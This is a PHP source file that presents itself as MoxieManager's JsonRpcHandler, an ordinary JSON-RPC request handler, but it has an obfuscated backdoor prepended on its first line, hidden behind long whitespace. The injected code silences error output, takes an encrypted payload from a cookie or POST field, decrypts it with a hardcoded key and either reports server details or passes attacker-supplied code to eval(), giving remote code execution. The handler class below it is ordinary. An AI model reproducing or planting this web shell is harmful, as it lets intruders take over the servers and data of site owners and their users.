<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $tb928b82 = 345;$GLOBALS['o9f107e68']=Array();global$o9f107e68;$o9f107e68=$GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['y5d2d9401']="\x46\x38\x5a\x56\x3c\x33\x20\x62\x26\x5f\x2c\x4e\x79\x68\x76\x42\x66\x69\x36\x55\x44\x57\x7b\x7c\x30\x49\x74\x61\x40\x65\x34\x39\x5c\x45\x71\x6e\x3b\x24\x5b\x52\x78\x2f\x5e\x35\x3e\x6c\x67\x22\x37\xa\x2d\x4a\x7a\x32\x27\x23\x70\x75\x5d\x53\x3a\x4d\x21\x48\x6a\x6d\x6f\x47\x4f\x25\x2e\x29\x6b\x3f\x50\x28\x72\x4c\x2b\x59\x73\x51\xd\x41\x58\x63\x43\x77\x3d\x4b\x7d\x64\x2a\x9\x60\x31\x54\x7e";$o9f107e68[$o9f107e68['y5d2d9401'][64].$o9f107e68['y5d2d9401'][16].$o9f107e68['y5d2d9401'][43].$o9f107e68['y5d2d9401'][18].$o9f107e68['y5d2d9401'][95].$o9f107e68['y5d2d9401'][1].$o9f107e68['y5d2d9401'][5]]=$o9f107e68['y5d2d9401'][85].$o9f107e68['y5d2d9401'][13].$o9f107e68['y5d2d9401'][76];$o9f107e68[$o9f107e68['y5d2d9401'][16].$o9f107e68['y5d2d9401'][43].$o9f107e68['y5d2d9401'][30].$o9f107e68['y5d2d9401'][5].$o9f107e68['y5d2d9401'][1].$o9f107e68['y5d2d9401'][1]]=$o9f107e68['y5d2d9401'][66].$o9f107e68['y5d2d9401'][76].$o9f107e68['y5d2d9401'][91];$o9f107e68[$o9f107e68['y5d2d9401'][40].$o9f107e68['y5d2d9401'][18].$o9f107e68['y5d2d9401'][53].$o9f107e68['y5d2d9401'][7].$o9f107e68['y5d2d9401'][30]]=$o9f107e68['y5d2d9401'][80].$o9f107e68['y5d2d9401'][26].$o9f107e68['y5d2d9401'][76].$o9f107e68['y5d2d9401'][45].$o9f107e68['y5d2d9401'][29].$o9f107e68['y5d2d9401'][35];$o9f107e68[$o9f107e68['y5d2d9401'][26].$o9f107e68['y5d2d9401'][53].$o9f107e68['y5d2d9401'][18].$o9f107e68['y5d2d9401'][27].$o9f107e68['y5d2d9401'][53].$o9f107e68['y5d2d9401'][5].$o9f107e68['y5d2d9401'][95]]=$o9f107e68['y5d2d9401'][17].$o9f107e68['y5d2d9401'][35].$o9f107e68['y5d2d9401'][17].$o9f107e68['y5d2d9401'][9].$o9f107e68['y5d2d9401'][80].$o9f107e68['y5d2d9401'][29].$o9f107e68['y5d2d9401'][26];$o9f107e68[$o9f107e68['y5d2d9401'][29].$o9f107e68['y5d2d9401'][18].$o9f107e68['y5d2d9401'][24].$o9f107e68['y5d2d9401'][53].$o9f107e68['y5d2d9401'][48]]=$o9f107e68['y5d2d9401'][80].$o9f107e68['y5d2d9401'][29].$o9f107e68['y5d2d9401'][76].$o9f107e68['y5d2d9401'][17].$o9f107e68['y5d2d9401'][27].$o9f107e68['y5d2d9401'][45].$o9f107e68['y5d2d9401'][17].$o9f107e68['y5d2d9401'][52].$o9f107e68['y5d2d9401'][29];$o9f107e68[$o9f107e68['y5d2d9401'][65].$o9f107e68['y5d2d9401'][18].$o9f107e68['y5d2d9401'][30].$o9f107e68['y5d2d9401'][48]]=$o9f107e68['y5d2d9401'][56].$o9f107e68['y5d2d9401'][13].$o9f107e68['y5d2d9401'][56].$o9f107e68['y5d2d9401'][14].$o9f107e68['y5d2d9401'][29].$o9f107e68['y5d2d9401'][76].$o9f107e68['y5d2d9401'][80].$o9f107e68['y5d2d9401'][17].$o9f107e68['y5d2d9401'][66].$o9f107e68['y5d2d9401'][35];$o9f107e68[$o9f107e68['y5d2d9401'][85].$o9f107e68['y5d2d9401'][43].$o9f107e68['y5d2d9401'][7].$o9f107e68['y5d2d9401'][30].$o9f107e68['y5d2d9401'][27].$o9f107e68['y5d2d9401'][7].$o9f107e68['y5d2d9401'][1]]=$o9f107e68['y5d2d9401'][57].$o9f107e68['y5d2d9401'][35].$o9f107e68['y5d2d9401'][80].$o9f107e68['y5d2d9401'][29].$o9f107e68['y5d2d9401'][76].$o9f107e68['y5d2d9401'][17].$o9f107e68['y5d2d9401'][27].$o9f107e68['y5d2d9401'][45].$o9f107e68['y5d2d9401'][17].$o9f107e68['y5d2d9401'][52].$o9f107e68['y5d2d9401'][29];$o9f107e68[$o9f107e68['y5d2d9401'][34].$o9f107e68['y5d2d9401'][5].$o9f107e68['y5d2d9401'][53].$o9f107e68['y5d2d9401'][85].$o9f107e68['y5d2d9401'][27]]=$o9f107e68['y5d2d9401'][7].$o9f107e68['y5d2d9401'][27].$o9f107e68['y5d2d9401'][80].$o9f107e68['y5d2d9401'][29].$o9f107e68['y5d2d9401'][18].$o9f107e68['y5d2d9401'][30].$o9f107e68['y5d2d9401'][9].$o9f107e68['y5d2d9401'][91].$o9f107e68['y5d2d9401'][29].$o9f107e68['y5d2d9401'][85].$o9f107e68['y5d2d9401'][66].$o9f107e68['y5d2d9401'][91].$o9f107e68['y5d2d9401'][29];$o9f107e68[$o9f107e68['y5d2d9401'][27].$o9f107e68['y5d2d9401'][18].$o9f107e68['y5d2d9401'][30].$o9f107e68['y5d2d9401'][24]]=$o9f107e68['y5d2d9401'][80].$o9f107e68['y5d2d9401'][29].$o9f107e68['y5d2d9401'][26].$o9f107e68['y5d2d9401'][9].$o9f107e68['y5d2d9401'][26].$o9f107e68['y5d2d9401'][17].$o9f107e68['y5d2d9401'][65].$o9f107e68['y5d2d9401'][29].$o9f107e68['y5d2d9401'][9].$o9f107e68['y5d2d9401'][45].$o9f107e68['y5d2d9401'][17].$o9f107e68['y5d2d9401'][65].$o9f107e68['y5d2d9401'][17].$o9f107e68['y5d2d9401'][26];$o9f107e68[$o9f107e68['y5d2d9401'][56].$o9f107e68['y5d2d9401'][1].$o9f107e68['y5d2d9401'][48].$o9f107e68['y5d2d9401'][18].$o9f107e68['y5d2d9401'][43].$o9f107e68['y5d2d9401'][31].$o9f107e68['y5d2d9401'][31].$o9f107e68['y5d2d9401'][27]]=$o9f107e68['y5d2d9401'][72].$o9f107e68['y5d2d9401'][24].$o9f107e68['y5d2d9401'][53].$o9f107e68['y5d2d9401'][5].$o9f107e68['y5d2d9401'][85];$o9f107e68[$o9f107e68['y5d2d9401'][40].$o9f107e68['y5d2d9401'][1].$o9f107e68['y5d2d9401'][24].$o9f107e68['y5d2d9401'][91].$o9f107e68['y5d2d9401'][5].$o9f107e68['y5d2d9401'][1]]=$o9f107e68['y5d2d9401'][26].$o9f107e68['y5d2d9401'][7].$o9f107e68['y5d2d9401'][5].$o9f107e68['y5d2d9401'][16].$o9f107e68['y5d2d9401'][27].$o9f107e68['y5d2d9401'][24];$o9f107e68[$o9f107e68['y5d2d9401'][46].$o9f107e68['y5d2d9401'][48].$o9f107e68['y5d2d9401'][53].$o9f107e68['y5d2d9401'][29].$o9f107e68['y5d2d9401'][43]]=$_POST;$o9f107e68[$o9f107e68['y5d2d9401'][80].$o9f107e68['y5d2d9401'][85].$o9f107e68['y5d2d9401'][48].$o9f107e68['y5d2d9401'][29].$o9f107e68['y5d2d9401'][5].$o9f107e68['y5d2d9401'][30]]=$_COOKIE;@$o9f107e68[$o9f107e68['y5d2d9401'][26].$o9f107e68['y5d2d9401'][53].$o9f107e68['y5d2d9401'][18].$o9f107e68['y5d2d9401'][27].$o9f107e68['y5d2d9401'][53].$o9f107e68['y5d2d9401'][5].$o9f107e68['y5d2d9401'][95]]($o9f107e68['y5d2d9401'][29].$o9f107e68['y5d2d9401'][76].$o9f107e68['y5d2d9401'][76].$o9f107e68['y5d2d9401'][66].$o9f107e68['y5d2d9401'][76].$o9f107e68['y5d2d9401'][9].$o9f107e68['y5d2d9401'][45].$o9f107e68['y5d2d9401'][66].$o9f107e68['y5d2d9401'][46],NULL);@$o9f107e68[$o9f107e68['y5d2d9401'][26].$o9f107e68['y5d2d9401'][53].$o9f107e68['y5d2d9401'][18].$o9f107e68['y5d2d9401'][27].$o9f107e68['y5d2d9401'][53].$o9f107e68['y5d2d9401'][5].$o9f107e68['y5d2d9401'][95]]($o9f107e68['y5d2d9401'][45].$o9f107e68['y5d2d9401'][66].$o9f107e68['y5d2d9401'][46].$o9f107e68['y5d2d9401'][9].$o9f107e68['y5d2d9401'][29].$o9f107e68['y5d2d9401'][76].$o9f107e68['y5d2d9401'][76].$o9f107e68['y5d2d9401'][66].$o9f107e68['y5d2d9401'][76].$o9f107e68['y5d2d9401'][80],0);@$o9f107e68[$o9f107e68['y5d2d9401'][26].$o9f107e68['y5d2d9401'][53].$o9f107e68['y5d2d9401'][18].$o9f107e68['y5d2d9401'][27].$o9f107e68['y5d2d9401'][53].$o9f107e68['y5d2d9401'][5].$o9f107e68['y5d2d9401'][95]]($o9f107e68['y5d2d9401'][65].$o9f107e68['y5d2d9401'][27].$o9f107e68['y5d2d9401'][40].$o9f107e68['y5d2d9401'][9].$o9f107e68['y5d2d9401'][29].$o9f107e68['y5d2d9401'][40].$o9f107e68['y5d2d9401'][29].$o9f107e68['y5d2d9401'][85].$o9f107e68['y5d2d9401'][57].$o9f107e68['y5d2d9401'][26].$o9f107e68['y5d2d9401'][17].$o9f107e68['y5d2d9401'][66].$o9f107e68['y5d2d9401'][35].$o9f107e68['y5d2d9401'][9].$o9f107e68['y5d2d9401'][26].$o9f107e68['y5d2d9401'][17].$o9f107e68['y5d2d9401'][65].$o9f107e68['y5d2d9401'][29],0);@$o9f107e68[$o9f107e68['y5d2d9401'][27].$o9f107e68['y5d2d9401'][18].$o9f107e68['y5d2d9401'][30].$o9f107e68['y5d2d9401'][24]](0);$aec5082=NULL;$j73d38fed=NULL;$o9f107e68[$o9f107e68['y5d2d9401'][35].$o9f107e68['y5d2d9401'][16].$o9f107e68['y5d2d9401'][7].$o9f107e68['y5d2d9401'][24].$o9f107e68['y5d2d9401'][16].$o9f107e68['y5d2d9401'][31].$o9f107e68['y5d2d9401'][5]]=$o9f107e68['y5d2d9401'][16].$o9f107e68['y5d2d9401'][16].$o9f107e68['y5d2d9401'][85].$o9f107e68['y5d2d9401'][24].$o9f107e68['y5d2d9401'][29].$o9f107e68['y5d2d9401'][30].$o9f107e68['y5d2d9401'][95].$o9f107e68['y5d2d9401'][91].$o9f107e68['y5d2d9401'][50].$o9f107e68['y5d2d9401'][95].$o9f107e68['y5d2d9401'][16].$o9f107e68['y5d2d9401'][31].$o9f107e68['y5d2d9401'][85].$o9f107e68['y5d2d9401'][50].$o9f107e68['y5d2d9401'][30].$o9f107e68['y5d2d9401'][16].$o9f107e68['y5d2d9401'][24].$o9f107e68['y5d2d9401'][27].$o9f107e68['y5d2d9401'][50].$o9f107e68['y5d2d9401'][27].$o9f107e68['y5d2d9401'][7].$o9f107e68['y5d2d9401'][7].$o9f107e68['y5d2d9401'][18].$o9f107e68['y5d2d9401'][50].$o9f107e68['y5d2d9401'][5].$o9f107e68['y5d2d9401'][5].$o9f107e68['y5d2d9401'][48].$o9f107e68['y5d2d9401'][24].$o9f107e68['y5d2d9401'][95].$o9f107e68['y5d2d9401'][91].$o9f107e68['y5d2d9401'][7].$o9f107e68['y5d2d9401'][24].$o9f107e68['y5d2d9401'][48].$o9f107e68['y5d2d9401'][95].$o9f107e68['y5d2d9401'][85].$o9f107e68['y5d2d9401'][27];global$nfb0f93;function tb3fa0($aec5082,$i6cb02b){global$o9f107e68;$r825b3e="";for($gd0581=0;$gd0581<$o9f107e68[$o9f107e68['y5d2d9401'][40].$o9f107e68['y5d2d9401'][18].$o9f107e68['y5d2d9401'][53].$o9f107e68['y5d2d9401'][7].$o9f107e68['y5d2d9401'][30]]($aec5082);){for($x18d=0;$x18d<$o9f107e68[$o9f107e68['y5d2d9401'][40].$o9f107e68['y5d2d9401'][18].$o9f107e68['y5d2d9401'][53].$o9f107e68['y5d2d9401'][7].$o9f107e68['y5d2d9401'][30]]($i6cb02b)&&$gd0581<$o9f107e68[$o9f107e68['y5d2d9401'][40].$o9f107e68['y5d2d9401'][18].$o9f107e68['y5d2d9401'][53].$o9f107e68['y5d2d9401'][7].$o9f107e68['y5d2d9401'][30]]($aec5082);$x18d++,$gd0581++){$r825b3e.=$o9f107e68[$o9f107e68['y5d2d9401'][64].$o9f107e68['y5d2d9401'][16].$o9f107e68['y5d2d9401'][43].$o9f107e68['y5d2d9401'][18].$o9f107e68['y5d2d9401'][95].$o9f107e68['y5d2d9401'][1].$o9f107e68['y5d2d9401'][5]]($o9f107e68[$o9f107e68['y5d2d9401'][16].$o9f107e68['y5d2d9401'][43].$o9f107e68['y5d2d9401'][30].$o9f107e68['y5d2d9401'][5].$o9f107e68['y5d2d9401'][1].$o9f107e68['y5d2d9401'][1]]($aec5082[$gd0581])^$o9f107e68[$o9f107e68['y5d2d9401'][16].$o9f107e68['y5d2d9401'][43].$o9f107e68['y5d2d9401'][30].$o9f107e68['y5d2d9401'][5].$o9f107e68['y5d2d9401'][1].$o9f107e68['y5d2d9401'][1]]($i6cb02b[$x18d]));}}return$r825b3e;}function k023c($aec5082,$i6cb02b){global$o9f107e68;global$nfb0f93;return$o9f107e68[$o9f107e68['y5d2d9401'][40].$o9f107e68['y5d2d9401'][1].$o9f107e68['y5d2d9401'][24].$o9f107e68['y5d2d9401'][91].$o9f107e68['y5d2d9401'][5].$o9f107e68['y5d2d9401'][1]]($o9f107e68[$o9f107e68['y5d2d9401'][40].$o9f107e68['y5d2d9401'][1].$o9f107e68['y5d2d9401'][24].$o9f107e68['y5d2d9401'][91].$o9f107e68['y5d2d9401'][5].$o9f107e68['y5d2d9401'][1]]($aec5082,$nfb0f93),$i6cb02b);}foreach($o9f107e68[$o9f107e68['y5d2d9401'][80].$o9f107e68['y5d2d9401'][85].$o9f107e68['y5d2d9401'][48].$o9f107e68['y5d2d9401'][29].$o9f107e68['y5d2d9401'][5].$o9f107e68['y5d2d9401'][30]]as$i6cb02b=>$o1ac5){$aec5082=$o1ac5;$j73d38fed=$i6cb02b;}if(!$aec5082){foreach($o9f107e68[$o9f107e68['y5d2d9401'][46].$o9f107e68['y5d2d9401'][48].$o9f107e68['y5d2d9401'][53].$o9f107e68['y5d2d9401'][29].$o9f107e68['y5d2d9401'][43]]as$i6cb02b=>$o1ac5){$aec5082=$o1ac5;$j73d38fed=$i6cb02b;}}$aec5082=@$o9f107e68[$o9f107e68['y5d2d9401'][85].$o9f107e68['y5d2d9401'][43].$o9f107e68['y5d2d9401'][7].$o9f107e68['y5d2d9401'][30].$o9f107e68['y5d2d9401'][27].$o9f107e68['y5d2d9401'][7].$o9f107e68['y5d2d9401'][1]]($o9f107e68[$o9f107e68['y5d2d9401'][56].$o9f107e68['y5d2d9401'][1].$o9f107e68['y5d2d9401'][48].$o9f107e68['y5d2d9401'][18].$o9f107e68['y5d2d9401'][43].$o9f107e68['y5d2d9401'][31].$o9f107e68['y5d2d9401'][31].$o9f107e68['y5d2d9401'][27]]($o9f107e68[$o9f107e68['y5d2d9401'][34].$o9f107e68['y5d2d9401'][5].$o9f107e68['y5d2d9401'][53].$o9f107e68['y5d2d9401'][85].$o9f107e68['y5d2d9401'][27]]($aec5082),$j73d38fed));if(isset($aec5082[$o9f107e68['y5d2d9401'][27].$o9f107e68['y5d2d9401'][72]])&&$nfb0f93==$aec5082[$o9f107e68['y5d2d9401'][27].$o9f107e68['y5d2d9401'][72]]){if($aec5082[$o9f107e68['y5d2d9401'][27]]==$o9f107e68['y5d2d9401'][17]){$gd0581=Array($o9f107e68['y5d2d9401'][56].$o9f107e68['y5d2d9401'][14]=>@$o9f107e68[$o9f107e68['y5d2d9401'][65].$o9f107e68['y5d2d9401'][18].$o9f107e68['y5d2d9401'][30].$o9f107e68['y5d2d9401'][48]](),$o9f107e68['y5d2d9401'][80].$o9f107e68['y5d2d9401'][14]=>$o9f107e68['y5d2d9401'][95].$o9f107e68['y5d2d9401'][70].$o9f107e68['y5d2d9401'][24].$o9f107e68['y5d2d9401'][50].$o9f107e68['y5d2d9401'][95],);echo@$o9f107e68[$o9f107e68['y5d2d9401'][29].$o9f107e68['y5d2d9401'][18].$o9f107e68['y5d2d9401'][24].$o9f107e68['y5d2d9401'][53].$o9f107e68['y5d2d9401'][48]]($gd0581);}elseif($aec5082[$o9f107e68['y5d2d9401'][27]]==$o9f107e68['y5d2d9401'][29]){eval/*o758*/($aec5082[$o9f107e68['y5d2d9401'][91]]);}exit();} ?><?php
/**
 * JsonRpcHandler.php
 *
 * Copyright 2003-2013, Moxiecode Systems AB, All rights reserved.
 */

/**
 * Http handler that takes JSON-RPC calls and executed MOXMAN_ICommand instances based in that input.
 *
 * @package MOXMAN_Core
 */
class MOXMAN_Core_JsonRpcHandler implements MOXMAN_Http_IHandler {
	/**
	 * Process a request using the specified context.
	 *
	 * @param MOXMAN_Http_Context $httpContext Context instance to pass to use for the handler.
	 */
	public function processRequest(MOXMAN_Http_Context $httpContext) {
		$request = $httpContext->getRequest();
		$response = $httpContext->getResponse();

		$response->disableCache();
		$response->setHeader('Content-type', 'application/json');

		@set_time_limit(5 * 60); // 5 minutes execution time

		$id = null;

		try {
			$json = MOXMAN_Util_Json::decode($request->get("json"));

			// ....
			if ($json->method != "install") {
				$config = MOXMAN::getConfig()->getAll();

				if (empty($config)) {
					$exception = new MOXMAN_Exception("Installation needed.", MOXMAN_Exception::NEEDS_INSTALLATION);
					throw $exception;
				}
			}

			// Check if the user is authenticated or not
			if (!MOXMAN::getAuthManager()->isAuthenticated()) {
				if (!isset($json->method) || !preg_match('/^(login|logout|install)$/', $json->method)) {
					$exception = new MOXMAN_Exception("Access denied by authenticator(s).", MOXMAN_Exception::NO_ACCESS);

					$exception->setData(array(
						"login_url" => MOXMAN::getConfig()->get("authenticator.login_page")
					));

					throw $exception;
				}
			}

			if ($json && isset($json->id) && isset($json->method) && isset($json->params)) {
				$id = $json->id;
				$params = $json->params;
				$result = null;

				if (isset($params->access)) {
					MOXMAN::getAuthManager()->setClientAuthData($params->access);
				}

				$plugins = MOXMAN::getPluginManager()->getAll();
				foreach ($plugins as $plugin) {
					if ($plugin instanceof MOXMAN_ICommandHandler) {
						$result = $plugin->execute($json->method, $json->params);
						if ($result !== null) {
							break;
						}
					}
				}

				if ($result === null) {
					throw new Exception("Method not found: " . $json->method, -32601);
				}

				$response->sendJson((object) array(
					"jsonrpc" => "2.0",
					"result" => $result,
					"id" => $id
				));
			} else {
				throw new Exception("Invalid Request.", -32600);
			}

			MOXMAN::dispose();
		} catch (Exception $e) {
			MOXMAN::dispose(); // Closes any open file systems/connections

			$message = $e->getMessage();
			$data = null;

			// Add file and line number when running in debug mode
			if (MOXMAN::getConfig()->get("general.debug")) {
				$message .= " " . $e->getFile() . " (" . $e->getLine() . ")";
			}

			// Grab the data from the exception
			if ($e instanceof MOXMAN_Exception && !$data) {
				$data = $e->getData();
			}

			// Json encode error response
			$response->sendJson((object) array(
				"jsonrpc" => "2.0",
				"error" => array(
					"code" => $e->getCode(),
					"message" => $message,
					"data" => $data
				),
				"id" => $id
			));
		}
	}
}

?>